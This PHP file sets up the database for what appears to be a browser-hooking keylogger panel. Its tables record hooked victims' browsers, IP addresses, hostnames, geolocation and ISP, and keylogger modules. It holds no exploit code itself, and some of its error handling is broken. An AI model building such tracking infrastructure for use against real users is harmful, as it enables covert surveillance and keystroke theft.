<?php
  // Database Configuration
  $_bdd = array();
  $_bdd['server'] = "127.0.0.1";
  $_bdd['port'] = "3306";
  $_bdd['user'] = "keylogger";
  $_bdd['password'] = "keylogger";
  $_bdd['database'] = "keylogger";

  function connectToDatabase() {
    global $_bdd;
  
    if(!isset($GLOBALS['___mysqli_ston'])) {
      $GLOBALS['___mysqli_ston'] = new mysqli($_bdd['server'], $_bdd['user'], $_bdd['password'], $_bdd['database'], $_bdd['port']);
        
      if($GLOBALS['___mysqli_ston']->connect_errno) {
        // TODO
      }
    }
  }

  function createOrRestoreDatabase() {
    global $_bdd;

    $GLOBALS['___mysqli_ston'] = new mysqli($_bdd['server'], $_bdd['user'], $_bdd['password'], "", $_bdd['port']);
    if($GLOBALS['___mysqli_ston']->connect_errno) {
      return;
    }

    if(!($stmt = $GLOBALS['___mysqli_ston']->prepare("DROP DATABASE IF EXISTS " . $_bdd['database']))) {
      $stmt->close();
      return;
    }

    if(!$stmt->execute()) {
      $stmt->close();
      return;
    }

    if(!($stmt = $GLOBALS['___mysqli_ston']->prepare("CREATE DATABASE " . $_bdd['database']))) {
      $stmt->close();
      return;
    }

    if(!$stmt->execute()) {
      $stmt->close();
      return;
    }

    if(!($stmt = $GLOBALS['___mysqli_ston']->select_db($_bdd['database']))) {
      $stmt->close();
      return;
    }

    // hooked_browers table
    if(!($stmt = $GLOBALS['___mysqli_ston']->prepare("CREATE TABLE hooked_browsers (id int(4) NOT NULL AUTO_INCREMENT, last_heartbeat DATETIME(3), browser_id varchar(32) NOT NULL, user_agent text, hostname text, public_ip text, PRIMARY KEY(id), UNIQUE(browser_id))"))) {
      $stmt->close();
      return;
    }
    if(!$stmt->execute()) {
      $stmt->close();
      return;
    }

    // event_browers table
    if(!($stmt = $GLOBALS['___mysqli_ston']->prepare("CREATE TABLE event_browsers (id int(4) NOT NULL AUTO_INCREMENT, date DATETIME(3), browser_id varchar(32) NOT NULL, type text, module text, event text, PRIMARY KEY(id))"))) {
      $stmt->close();
      return;
    }
    if(!$stmt->execute()) {
      $stmt->close();
      return;
    }

    // geoloc_browers table
    if(!($stmt = $GLOBALS['___mysqli_ston']->prepare("CREATE TABLE geoloc_browsers (id int(4) NOT NULL AUTO_INCREMENT, browser_id varchar(32) NOT NULL, country text, region_name text, city text, district text, zip text, lat text, lon text, isp text, PRIMARY KEY(id), UNIQUE(browser_id))"))) {
      $stmt->close();
      return;
    }
    if(!$stmt->execute()) {
      $stmt->close();
      return;
    }

    // keylogger_browers table
    if(!($stmt = $GLOBALS['___mysqli_ston']->prepare("CREATE TABLE keylogger_browsers (id int(4) NOT NULL AUTO_INCREMENT, date DATETIME(3), browser_id varchar(32) NOT NULL, keylogger_func text, PRIMARY KEY(id), UNIQUE(browser_id))"))) {
      $stmt->close();
      return;
    }
    if(!$stmt->execute()) {
      $stmt->close();
      return;
    }
  }
?>